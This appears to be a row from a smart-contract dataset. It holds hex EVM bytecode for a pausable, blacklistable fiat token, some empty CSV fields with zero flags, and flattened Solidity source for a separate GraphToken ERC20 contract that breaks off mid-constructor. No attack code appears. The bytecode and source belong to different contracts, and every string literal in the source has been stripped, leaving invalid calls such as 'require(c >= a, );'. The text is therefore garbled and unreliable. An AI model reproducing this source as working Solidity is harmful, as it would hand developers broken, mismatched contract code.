573ffffffffffffffffffffffffffffffffffffffff166128e6565b61074a61290e565b61034361292a565b61074a6129a3565b61040d6129bf565b6103f1600480360360408110156109c357600080fd5b5073ffffffffffffffffffffffffffffffffffffffff81351690602001356129e3565b6103f1600480360360408110156109fc57600080fd5b5073ffffffffffffffffffffffffffffffffffffffff8135169060200135612b65565b61045260048036036020811015610a3557600080fd5b503573ffffffffffffffffffffffffffffffffffffffff16612ce7565b6103f160048036036020811015610a6857600080fd5b503573ffffffffffffffffffffffffffffffffffffffff16612e4e565b61045260048036036020811015610a9b57600080fd5b503573ffffffffffffffffffffffffffffffffffffffff16612e79565b61045260048036036060811015610ace57600080fd5b5073ffffffffffffffffffffffffffffffffffffffff813581169160208101359091169060400135612fe0565b61074a613076565b610452600480360360e0811015610b1957600080fd5b5073ffffffffffffffffffffffffffffffffffffffff813581169160208101359091169060408101359060608101359060ff6080820135169060a08101359060c00135613092565b61045260048036036020811015610b7757600080fd5b810190602081018135640100000000811115610b9257600080fd5b820183602082011115610ba457600080fd5b80359060200191846001830284011164010000000083111715610bc657600080fd5b509092509050613238565b61040d613321565b61040d60048036036040811015610bef57600080fd5b5073ffffffffffffffffffffffffffffffffffffffff81358116916020013516613345565b6104526004803603610120811015610c2b57600080fd5b5073ffffffffffffffffffffffffffffffffffffffff813581169160208101359091169060408101359060608101359060808101359060a08101359060ff60c0820135169060e081013590610100013561337d565b610343613527565b6103f160048036036040811015610c9e57600080fd5b5073ffffffffffffffffffffffffffffffffffffffff81351690602001356135a0565b6104526004803603610120811015610cd857600080fd5b5073ffffffffffffffffffffffffffffffffffffffff813581169160208101359091169060408101359060608101359060808101359060a08101359060ff60c0820135169060e08101359061010001356135d8565b61045260048036036020811015610d4357600080fd5b503573ffffffffffffffffffffffffffffffffffffffff16613775565b61045260048036036020811015610d7657600080fd5b503573ffffffffffffffffffffffffffffffffffffffff166138c8565b6103f160048036036020811015610da957600080fd5b503573ffffffffffffffffffffffffffffffffffffffff166139af565b6004805460408051602060026001851615610100027fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff0190941693909304601f81018490048402820184019092528181529291830182828015610e6a5780601f10610e3f57610100808354040283529160200191610e6a565b820191906000526020600020905b815481529060010190602001808311610e4d57829003601f168201915b505050505081565b60015460009074010000000000000000000000000000000000000000900460ff1615610eff57604080517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820152601060248201527f5061757361626c653a2070617573656400000000000000000000000000000000604482015290519081900360640190fd5b3360008181526003602052604090205460ff1615610f68576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260258152602001806153476025913960400191505060405180910390fd5b73ffffffffffffffffffffffffffffffffffffffff8416600090815260036020526040902054849060ff1615610fe9576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260258152602001806153476025913960400191505060405180910390fd5b610ff43386866139da565b506001949350505050565b600b5490565b60025473ffffffffffffffffffffffffffffffffffffffff163314611075576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252602c81526020018061506b602c913960400191505060405180910390fd5b73ffffffffffffffffffffffffffffffffffffffff811660008181526003602052604080822080547fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff00169055517f117e3210bb9aa7d9baff172026820255c6f6c30ba8999d1c2fd88e2848137c4e9190a250565b60015460009074010000000000000000000000000000000000000000900460ff161561117657604080517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820152601060248201527f5061757361626c653a2070617573656400000000000000000000000000000000604482015290519081900360640190fd5b3360008181526003602052604090205460ff16156111df576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260258152602001806153476025913960400191505060405180910390fd5b73ffffffffffffffffffffffffffffffffffffffff8516600090815260036020526040902054859060ff1615611260576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260258152602001806153476025913960400191505060405180910390fd5b73ffffffffffffffffffffffffffffffffffffffff8516600090815260036020526040902054859060ff16156112e1576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260258152602001806153476025913960400191505060405180910390fd5b73ffffffffffffffffffffffffffffffffffffffff87166000908152600a6020908152604080832033845290915290205485111561136a576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260288152602001806151316028913960400191505060405180910390fd5b611375878787613b21565b73ffffffffffffffffffffffffffffffffffffffff87166000908152600a602090815260408083203384529091529020546113b09086613d4c565b73ffffffffffffffffffffffffffffffffffffffff88166000908152600a60209081526040808320338452909152902055600193505050509392505050565b60005473ffffffffffffffffffffffffffffffffffffffff16331461147557604080517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820181905260248201527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572604482015290519081900360640190fd5b73ffffffffffffffffffffffffffffffffffffffff81166114e1576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252602a815260200180614fc9602a913960400191505060405180910390fd5b600e80547fffffffffffffffffffffffff00000000000000000000000000000000000000001673ffffffffffffffffffffffffffffffffffffffff83169081179091556040517fe475e580d85111348e40d8ca33cfdd74c30fe1655c2d8537a13abc10065ffa5a90600090a250565b60125460ff1660011461156257600080fd5b30600090815260096020526040902054801561158357611583308383613b21565b505030600090815260036020526040902080547fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff00908116600117909155601280549091166002179055565b60085460009073ffffffffffffffffffffffffffffffffffffffff163314611641576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260298152602001806150426029913960400191505060405180910390fd5b73ffffffffffffffffffffffffffffffffffffffff82166000818152600c6020908152604080832080547fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff00169055600d909152808220829055517fe94479a9f7e1952cc78f2d6baab678adc1b772d936c6583def489e524cb666929190a2506001919050565b7f6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c981565b60065460ff1681565b60085474010000000000000000000000000000000000000000900460ff1615611768576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252602a8152602001806151ac602a913960400191505060405180910390fd5b73ffffffffffffffffffffffffffffffffffffffff84166117d4576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252602f8152602001806150de602f913960400191505060405180910390fd5b73ffffffffffffffffffffffffffffffffffffffff8316611840576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526029815260200180614fa06029913960400191505060405180910390fd5b73ffffffffffffffffffffffffffffffffffffffff82166118ac576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252602e815260200180615159602e913960400191505060405180910390fd5b73ffffffffffffffffffffffffffffffffffffffff8116611918576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260288152602001806152bf6028913960400191505060405180910390fd5b875161192b9060049060208b0190614d50565b50865161193f9060059060208a0190614d50565b508551611953906007906020890190614d50565b50600680547fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff001660ff8716179055600880547fffffffffffffffffffffffff000000000000000000000000000000000000000090811673ffffffffffffffffffffffffffffffffffffffff87811691909117909255600180548216868416179055600280549091169184169190911790556119ed81613d95565b5050600880547fffffffffffffffffffffff00ffffffffffffffffffffffffffffffffffffffff1674010000000000000000000000000000000000000000179055505050505050565b60085473ffffffffffffffffffffffffffffffffffffffff1681565b600f5481565b600e5473ffffffffffffffffffffffffffffffffffffffff1690565b60015460009074010000000000000000000000000000000000000000900460ff1615611b0157604080517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820152601060248201527f5061757361626c653a2070617573656400000000000000000000000000000000604482015290519081900360640190fd5b3360008181526003602052604090205460ff1615611b6a576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260258152602001806153476025913960400191505060405180910390fd5b73ffffffffffffffffffffffffffffffffffffffff8416600090815260036020526040902054849060ff1615611beb576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260258152602001806153476025913960400191505060405180910390fd5b610ff4338686613ddc565b60015473ffffffffffffffffffffffffffffffffffffffff163314611c66576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252602281526020018061524d6022913960400191505060405180910390fd5b600180547fffffffffffffffffffffff00ffffffffffffffffffffffffffffffffffffffff1690556040517f7805862f689e2f13df9f062ff482ad3ad112aca9e0847911ed832e158c525b3390600090a1565b60015460009074010000000000000000000000000000000000000000900460ff1615611d4657604080517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820152601060248201527f5061757361626c653a2070617573656400000000000000000000000000000000604482015290519081900360640190fd5b336000908152600c602052604090205460ff16611dae576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260218152602001806150bd6021913960400191505060405180910390fd5b3360008181526003602052604090205460ff1615611e17576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260258152602001806153476025913960400191505060405180910390fd5b73ffffffffffffffffffffffffffffffffffffffff8416600090815260036020526040902054849060ff1615611e98576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260258152602001806153476025913960400191505060405180910390fd5b73ffffffffffffffffffffffffffffffffffffffff8516611f04576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526023815260200180614f0f6023913960400191505060405180910390fd5b60008411611f5d576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526029815260200180614ff36029913960400191505060405180910390fd5b336000908152600d602052604090205480851115611fc6576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252602e81526020018061521f602e913960400191505060405180910390fd5b600b54611fd39086613e26565b600b5573ffffffffffffffffffffffffffffffffffffffff86166000908152600960205260409020546120069086613e26565b73ffffffffffffffffffffffffffffffffffffffff87166000908152600960205260409020556120368186613d4c565b336000818152600d6020908152604091829020939093558051888152905173ffffffffffffffffffffffffffffffffffffffff8a16937fab8530f87dc9b59234c4623bf917212bb2536d647574c8e7e5da92c2ede0c9f8928290030190a360408051868152905173ffffffffffffffffffffffffffffffffffffffff8816916000917fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9181900360200190a350600195945050505050565b60015474010000000000000000000000000000000000000000900460ff161561217857604080517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820152601060248201527f5061757361626c653a2070617573656400000000000000000000000000000000604482015290519081900360640190fd5b336000908152600c602052604090205460ff166121e0576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260218152602001806150bd6021913960400191505060405180910390fd5b3360008181526003602052604090205460ff1615612249576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260258152602001806153476025913960400191505060405180910390fd5b33600090815260096020526040902054826122af576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526029815260200180614ee66029913960400191505060405180910390fd5b82811015612308576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260268152602001806150976026913960400191505060405180910390fd5b600b546123159084613d4c565b600b556123228184613d4c565b33600081815260096020908152604091829020939093558051868152905191927fcc16f5dbb4873280815c1ee09dbd06736cffcc184412cf7a71a0fdb75d397ca592918290030190a260408051848152905160009133917fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9181900360200190a3505050565b60015460009074010000000000000000000000000000000000000000900460ff161561243557604080517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820152601060248201527f5061757361626c653a2070617573656400000000000000000000000000000000604482015290519081900360640190fd5b60085473ffffffffffffffffffffffffffffffffffffffff1633146124a5576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260298152602001806150426029913960400191505060405180910390fd5b73ffffffffffffffffffffffffffffffffffffffff83166000818152600c6020908152604080832080547fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff00166001179055600d825291829020859055815185815291517f46980fca912ef9bcdbd36877427b6b90e860769f604e89c0e67720cece530d209281900390910190a250600192915050565b60408051808201909152600181527f3200000000000000000000000000000000000000000000000000000000000000602082015290565b60005473ffffffffffffffffffffffffffffffffffffffff1633146125f857604080517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820181905260248201527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572604482015290519081900360640190fd5b73ffffffffffffffffffffffffffffffffffffffff8116612664576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526028815260200180614e936028913960400191505060405180910390fd5b600180547fffffffffffffffffffffffff00000000000000000000000000000000000000001673ffffffffffffffffffffffffffffffffffffffff83811691909117918290556040519116907fb80482a293ca2e013eda8683c9bd7fc8347cfdaeea5ede58cba46df502c2a60490600090a250565b60015474010000000000000000000000000000000000000000900460ff161561276357604080517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820152601060248201527f5061757361626c653a2070617573656400000000000000000000000000000000604482015290519081900360640190fd5b6127708585858585613e9a565b5050505050565b60015474010000000000000000000000000000000000000000900460ff1681565b73ffffffffffffffffffffffffffffffffffffffff1660009081526009602052604090205490565b73ffffffffffffffffffffffffffffffffffffffff1660009081526011602052604090205490565b7fd099cc98ef71107a616c4f0f941f04c322d8e254fe26b3c6668db87aae413de881565b60015473ffffffffffffffffffffffffffffffffffffffff16331461287c576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252602281526020018061524d6022913960400191505060405180910390fd5b600180547fffffffffffffffffffffff00ffffffffffffffffffffffffffffffffffffffff16740100000000000000000000000000000000000000001790556040517f6985a02210a168e66602d3235cb6db0e70f92b3ba4d376a33c0f3d9434bff62590600090a1565b73ffffffffffffffffffffffffffffffffffffffff166000908152600d602052604090205490565b60005473ffffffffffffffffffffffffffffffffffffffff1690565b6005805460408051602060026001851615610100027fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff0190941693909304601f81018490048402820184019092528181529291830182828015610e6a5780601f10610e3f57610100808354040283529160200191610e6a565b60015473ffffffffffffffffffffffffffffffffffffffff1681565b7f7c7c6cdb67a18743f49ec6fa9b35f50d52ed05cbed4cc592e13b44501c1a226781565b60015460009074010000000000000000000000000000000000000000900460ff1615612a7057604080517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820152601060248201527f5061757361626c653a2070617573656400000000000000000000000000000000604482015290519081900360640190fd5b3360008181526003602052604090205460ff1615612ad9576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260258152602001806153476025913960400191505060405180910390fd5b73ffffffffffffffffffffffffffffffffffffffff8416600090815260036020526040902054849060ff1615612b5a576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260258152602001806153476025913960400191505060405180910390fd5b610ff4338686614023565b60015460009074010000000000000000000000000000000000000000900460ff1615612bf257604080517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820152601060248201527f5061757361626c653a2070617573656400000000000000000000000000000000604482015290519081900360640190fd5b3360008181526003602052604090205460ff1615612c5b576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260258152602001806153476025913960400191505060405180910390fd5b73ffffffffffffffffffffffffffffffffffffffff8416600090815260036020526040902054849060ff1615612cdc576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260258152602001806153476025913960400191505060405180910390fd5b610ff4338686613b21565b60005473ffffffffffffffffffffffffffffffffffffffff163314612d6d57604080517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820181905260248201527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572604482015290519081900360640190fd5b73ffffffffffffffffffffffffffffffffffffffff8116612dd9576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252602f8152602001806150de602f913960400191505060405180910390fd5b600880547fffffffffffffffffffffffff00000000000000000000000000000000000000001673ffffffffffffffffffffffffffffffffffffffff83811691909117918290556040519116907fdb66dfa9c6b8f5226fe9aac7e51897ae8ee94ac31dc70bb6c9900b2574b707e690600090a250565b73ffffffffffffffffffffffffffffffffffffffff166000908152600c602052604090205460ff1690565b60005473ffffffffffffffffffffffffffffffffffffffff163314612eff57604080517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820181905260248201527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572604482015290519081900360640190fd5b73ffffffffffffffffffffffffffffffffffffffff8116612f6b576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260328152602001806153156032913960400191505060405180910390fd5b600280547fffffffffffffffffffffffff00000000000000000000000000000000000000001673ffffffffffffffffffffffffffffffffffffffff83811691909117918290556040519116907fc67398012c111ce95ecb7429b933096c977380ee6c421175a71a4a4c6c88c06e90600090a250565b600e5473ffffffffffffffffffffffffffffffffffffffff163314613050576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252602481526020018061510d6024913960400191505060405180910390fd5b61307173ffffffffffffffffffffffffffffffffffffffff8416838361407f565b505050565b60025473ffffffffffffffffffffffffffffffffffffffff1681565b60015474010000000000000000000000000000000000000000900460ff161561311c57604080517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820152601060248201527f5061757361626c653a2070617573656400000000000000000000000000000000604482015290519081900360640190fd5b73ffffffffffffffffffffffffffffffffffffffff8716600090815260036020526040902054879060ff161561319d576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260258152602001806153476025913960400191505060405180910390fd5b73ffffffffffffffffffffffffffffffffffffffff8716600090815260036020526040902054879060ff161561321e576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260258152602001806153476025913960400191505060405180910390fd5b61322d8989898989898961410c565b505050505050505050565b60085474010000000000000000000000000000000000000000900460ff168015613265575060125460ff16155b61326e57600080fd5b61327a60048383614dce565b506132ef82828080601f0160208091040260200160405190810160405280939291908181526020018383808284376000920191909152505060408051808201909152600181527f3200000000000000000000000000000000000000000000000000000000000000602082015291506142b59050565b600f555050601280547fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff00166001179055565b7f158b0a9edf7a828aad02f63cd515c68ef2f50ba807396f6d12842833a159742981565b73ffffffffffffffffffffffffffffffffffffffff9182166000908152600a6020908152604080832093909416825291909152205490565b60015474010000000000000000000000000000000000000000900460ff161561340757604080517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820152601060248201527f5061757361626c653a2070617573656400000000000000000000000000000000604482015290519081900360640190fd5b73ffffffffffffffffffffffffffffffffffffffff8916600090815260036020526040902054899060ff1615613488576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260258152602001806153476025913960400191505060405180910390fd5b73ffffffffffffffffffffffffffffffffffffffff8916600090815260036020526040902054899060ff1615613509576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260258152602001806153476025913960400191505060405180910390fd5b61351a8b8b8b8b8b8b8b8b8b614327565b5050505050505050505050565b6007805460408051602060026001851615610100027fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff0190941693909304601f81018490048402820184019092528181529291830182828015610e6a5780601f10610e3f57610100808354040283529160200191610e6a565b73ffffffffffffffffffffffffffffffffffffffff919091166000908152601060209081526040808320938352929052205460ff1690565b60015474010000000000000000000000000000000000000000900460ff161561366257604080517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820152601060248201527f5061757361626c653a2070617573656400000000000000000000000000000000604482015290519081900360640190fd5b73ffffffffffffffffffffffffffffffffffffffff8916600090815260036020526040902054899060ff16156136e3576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260258152602001806153476025913960400191505060405180910390fd5b73ffffffffffffffffffffffffffffffffffffffff8916600090815260036020526040902054899060ff1615613764576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260258152602001806153476025913960400191505060405180910390fd5b61351a8b8b8b8b8b8b8b8b8b614469565b60005473ffffffffffffffffffffffffffffffffffffffff1633146137fb57604080517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820181905260248201527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572604482015290519081900360640190fd5b73ffffffffffffffffffffffffffffffffffffffff8116613867576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526026815260200180614f586026913960400191505060405180910390fd5b6000546040805173ffffffffffffffffffffffffffffffffffffffff9283168152918316602083015280517f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e09281900390910190a16138c581613d95565b50565b60025473ffffffffffffffffffffffffffffffffffffffff163314613938576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252602c81526020018061506b602c913960400191505060405180910390fd5b73ffffffffffffffffffffffffffffffffffffffff811660008181526003602052604080822080547fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff00166001179055517fffa4e6181777692565cf28528fc88fd1516ea86b56da075235fa575af6a4b8559190a250565b73ffffffffffffffffffffffffffffffffffffffff1660009081526003602052604090205460ff1690565b73ffffffffffffffffffffffffffffffffffffffff8316613a46576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260248152602001806151fb6024913960400191505060405180910390fd5b73ffffffffffffffffffffffffffffffffffffffff8216613ab2576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526022815260200180614f7e6022913960400191505060405180910390fd5b73ffffffffffffffffffffffffffffffffffffffff8084166000818152600a6020908152604080832094871680845294825291829020859055815185815291517f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b9259281900390910190a3505050565b73ffffffffffffffffffffffffffffffffffffffff8316613b8d576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260258152602001806151d66025913960400191505060405180910390fd5b73ffffffffffffffffffffffffffffffffffffffff8216613bf9576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526023815260200180614e706023913960400191505060405180910390fd5b73ffffffffffffffffffffffffffffffffffffffff8316600090815260096020526040902054811115613c77576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252602681526020018061501c6026913960400191505060405180910390fd5b73ffffffffffffffffffffffffffffffffffffffff8316600090815260096020526040902054613ca79082613d4c565b73ffffffffffffffffffffffffffffffffffffffff8085166000908152600960205260408082209390935590841681522054613ce39082613e26565b73ffffffffffffffffffffffffffffffffffffffff80841660008181526009602090815260409182902094909455805185815290519193928716927fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef92918290030190a3505050565b6000613d8e83836040518060400160405280601e81526020017f536166654d6174683a207375627472616374696f6e206f766572666c6f770000815250614576565b9392505050565b600080547fffffffffffffffffffffffff00000000000000000000000000000000000000001673ffffffffffffffffffffffffffffffffffffffff92909216919091179055565b73ffffffffffffffffffffffffffffffffffffffff8084166000908152600a60209081526040808320938616835292905220546130719084908490613e219085613e26565b6139da565b600082820183811015613d8e57604080517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820152601b60248201527f536166654d6174683a206164646974696f6e206f766572666c6f770000000000604482015290519081900360640190fd5b613ea48585614627565b604080517f158b0a9edf7a828aad02f63cd515c68ef2f50ba807396f6d12842833a1597429602082015273ffffffffffffffffffffffffffffffffffffffff87168183018190526060828101889052835180840390910181526080909201909252600f54909190613f1890868686866146b5565b73ffffffffffffffffffffffffffffffffffffffff1614613f9a57604080517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820152601e60248201527f46696174546f6b656e56323a20696e76616c6964207369676e61747572650000604482015290519081900360640190fd5b73ffffffffffffffffffffffffffffffffffffffff8616600081815260106020908152604080832089845290915280822080547fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff00166001179055518792917f1cdd46ff,,,,,,,0,,,,,,,,,,0
"pragma solidity ^0.7.0;abstract contract Context { function _msgSender() internal view virtual returns (address payable) { return msg.sender; } function _msgData() internal view virtual returns (bytes memory) { this; return msg.data; }}pragma solidity ^0.7.0;interface IERC20 { function totalSupply() external view returns (uint256); function balanceOf(address account) external view returns (uint256); function transfer(address recipient, uint256 amount) external returns (bool); function allowance(address owner, address spender) external view returns (uint256); function approve(address spender, uint256 amount) external returns (bool); function transferFrom(address sender, address recipient, uint256 amount) external returns (bool); event Transfer(address indexed from, address indexed to, uint256 value); event Approval(address indexed owner, address indexed spender, uint256 value);}pragma solidity ^0.7.0;library SafeMath { function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; require(c >= a, ); return c; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { return sub(a, b, ); } function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) { require(b <= a, errorMessage); uint256 c = a - b; return c; } function mul(uint256 a, uint256 b) internal pure returns (uint256) { if (a == 0) { return 0; } uint256 c = a * b; require(c / a == b, ); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { return div(a, b, ); } function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) { require(b > 0, errorMessage); uint256 c = a / b; return c; } function mod(uint256 a, uint256 b) internal pure returns (uint256) { return mod(a, b, ); } function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) { require(b != 0, errorMessage); return a % b; }}pragma solidity ^0.7.0;contract ERC20 is Context, IERC20 { using SafeMath for uint256; mapping (address => uint256) private _balances; mapping (address => mapping (address => uint256)) private _allowances; uint256 private _totalSupply; string private _name; string private _symbol; uint8 private _decimals; constructor (string memory name_, string memory symbol_) { _name = name_; _symbol = symbol_; _decimals = 18; } function name() public view returns (string memory) { return _name; } function symbol() public view returns (string memory) { return _symbol; } function decimals() public view returns (uint8) { return _decimals; } function totalSupply() public view override returns (uint256) { return _totalSupply; } function balanceOf(address account) public view override returns (uint256) { return _balances[account]; } function transfer(address recipient, uint256 amount) public virtual override returns (bool) { _transfer(_msgSender(), recipient, amount); return true; } function allowance(address owner, address spender) public view virtual override returns (uint256) { return _allowances[owner][spender]; } function approve(address spender, uint256 amount) public virtual override returns (bool) { _approve(_msgSender(), spender, amount); return true; } function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) { _transfer(sender, recipient, amount); _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, )); return true; } function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) { _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue)); return true; } function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) { _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, )); return true; } function _transfer(address sender, address recipient, uint256 amount) internal virtual { require(sender != address(0), ); require(recipient != address(0), ); _beforeTokenTransfer(sender, recipient, amount); _balances[sender] = _balances[sender].sub(amount, ); _balances[recipient] = _balances[recipient].add(amount); emit Transfer(sender, recipient, amount); } function _mint(address account, uint256 amount) internal virtual { require(account != address(0), ); _beforeTokenTransfer(address(0), account, amount); _totalSupply = _totalSupply.add(amount); _balances[account] = _balances[account].add(amount); emit Transfer(address(0), account, amount); } function _burn(address account, uint256 amount) internal virtual { require(account != address(0), ); _beforeTokenTransfer(account, address(0), amount); _balances[account] = _balances[account].sub(amount, ); _totalSupply = _totalSupply.sub(amount); emit Transfer(account, address(0), amount); } function _approve(address owner, address spender, uint256 amount) internal virtual { require(owner != address(0), ); require(spender != address(0), ); _allowances[owner][spender] = amount; emit Approval(owner, spender, amount); } function _setupDecimals(uint8 decimals_) internal { _decimals = decimals_; } function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }}pragma solidity ^0.7.0;abstract contract ERC20Burnable is Context, ERC20 { using SafeMath for uint256; function burn(uint256 amount) public virtual { _burn(_msgSender(), amount); } function burnFrom(address account, uint256 amount) public virtual { uint256 decreasedAllowance = allowance(account, _msgSender()).sub(amount, ); _approve(account, _msgSender(), decreasedAllowance); _burn(account, amount); }}pragma solidity ^0.7.0;library ECDSA { function recover(bytes32 hash, bytes memory signature) internal pure returns (address) { if (signature.length != 65) { revert(); } bytes32 r; bytes32 s; uint8 v; assembly { r := mload(add(signature, 0x20)) s := mload(add(signature, 0x40)) v := byte(0, mload(add(signature, 0x60))) } require(uint256(s) <= 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0, ); require(v == 27 || v == 28, ); address signer = ecrecover(hash, v, r, s); require(signer != address(0), ); return signer; } function toEthSignedMessageHash(bytes32 hash) internal pure returns (bytes32) { return keccak256(abi.encodePacked(, hash)); }}pragma solidity ^0.7.3;contract Governed { address public governor; address public pendingGovernor; event NewPendingOwnership(address indexed from, address indexed to); event NewOwnership(address indexed from, address indexed to); modifier onlyGovernor { require(msg.sender == governor, ); _; } function _initialize(address _initGovernor) internal { governor = _initGovernor; } function transferOwnership(address _newGovernor) external onlyGovernor { require(_newGovernor != address(0), ); address oldPendingGovernor = pendingGovernor; pendingGovernor = _newGovernor; emit NewPendingOwnership(oldPendingGovernor, pendingGovernor); } function acceptOwnership() external { require( pendingGovernor != address(0) && msg.sender == pendingGovernor, ); address oldGovernor = governor; address oldPendingGovernor = pendingGovernor; governor = pendingGovernor; pendingGovernor = address(0); emit NewOwnership(oldGovernor, governor); emit NewPendingOwnership(oldPendingGovernor, pendingGovernor); }}pragma solidity ^0.7.3;contract GraphToken is Governed, ERC20, ERC20Burnable { using SafeMath for uint256; bytes32 private constant DOMAIN_TYPE_HASH = keccak256( ); bytes32 private constant DOMAIN_NAME_HASH = keccak256(); bytes32 private constant DOMAIN_VERSION_HASH = keccak256(); bytes32 private constant DOMAIN_SALT = 0x51f3d585afe6dfeb2af01bba0889a36c1db03beec88c6a4d0c53817069026afa; bytes32 private constant PERMIT_TYPEHASH = keccak256( ); bytes32 private DOMAIN_SEPARATOR; mapping(address => bool) private _minters; mapping(address => uint256) public nonces; event MinterAdded(address indexed account); event MinterRemoved(address indexed account); modifier onlyMinter() { require(isMinter(msg.sender), ); _; } constructor(uint256 _initialSupply) ERC20(, ) { Governed._initialize(msg.sender); _mint(msg.sender, 